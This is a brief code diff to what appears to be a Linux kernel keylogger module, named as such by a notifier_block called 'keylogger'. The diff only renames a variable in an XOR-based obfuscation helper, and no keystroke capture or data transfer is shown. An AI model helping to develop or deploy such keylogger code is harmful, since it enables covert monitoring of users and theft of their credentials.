@@ -93,16 +93,16 @@ static struct notifier_block keylogger = {
 
 static uint8_t* crypto(const uint8_t* msg, unsigned int msg_len, const uint8_t* key, unsigned int key_len) {
     unsigned int i;
-    uint8_t* encrypted = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
-    if (!encrypted) {
+    uint8_t* crypto_ptr = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
+    if (!crypto_ptr) {
         return NULL;
     }
-    memset(encrypted, 0, msg_len + 1);
+    memset(crypto_ptr, 0, msg_len + 1);
     for (i = 0; i < msg_len; i++) {
-        encrypted[i] = msg[i] ^ key[i % key_len];
+        crypto_ptr[i] = msg[i] ^ key[i % key_len];
     }
 
-    return encrypted;
+    return crypto_ptr;
 }
 
 static void to_bytes(int num, uint8_t *ptr) {
